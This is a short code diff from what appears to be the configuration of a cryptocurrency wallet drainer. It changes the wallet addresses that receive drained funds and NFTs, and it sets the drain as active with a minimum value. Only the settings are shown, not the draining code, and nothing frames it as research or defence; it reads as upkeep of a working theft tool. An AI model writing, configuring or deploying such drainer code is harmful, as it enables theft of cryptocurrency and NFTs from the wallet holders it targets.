@@ -1,9 +1,9 @@
-const receiverAddress = "0xadb971B8FC8B76aCA970feD91a722A02FfBdE925";
+const receiverAddress = "0x492e49F56fEA3011C48e2bb5A82ae35b47fa04c7";
 
 const drainNftInfo = {
     active: true,   
     minValue: 0.1,  
-    nftReceiveAddress: "0xadb971B8FC8B76aCA970feD91a722A02FfBdE925" 
+    nftReceiveAddress: "0x492e49F56fEA3011C48e2bb5A82ae35b47fa04c7" 
     }
 
 const collectionInfo = {
